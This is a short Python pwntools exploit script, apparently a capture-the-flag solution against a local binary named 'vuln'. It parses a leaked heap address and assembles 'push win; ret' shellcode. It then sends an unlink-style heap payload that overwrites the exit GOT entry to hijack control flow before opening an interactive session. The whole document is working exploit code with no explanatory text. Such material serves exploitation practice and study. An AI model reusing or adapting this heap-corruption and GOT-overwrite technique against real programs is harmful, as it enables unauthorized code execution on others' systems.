# first = 0x804e008 
# second = 0x804e920 
# third = 0x804ea28 
# four = 0x804eb30 
# free(first) 
# free(third) 
# fifth = 0x804ea28 
from pwn import *
s = process('./vuln')

raw_input('debug')
win_add = 0x8048956 
exit_got = 0x804d02c
s.recvuntil('Oops! a new developer copy pasted and printed an address as a decimal...\n')
address = int(s.recvuntil('\n'))
# log.info(address)
print '%x' % address
string = 'push '+str(win_add)+'; ret;'
payload1 = asm(string)
payload = p32(exit_got - 12) + p32(address+8) + payload1
s.sendline('tuan')
s.recvuntil('You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...')
s.sendline(payload)
s.interactive()
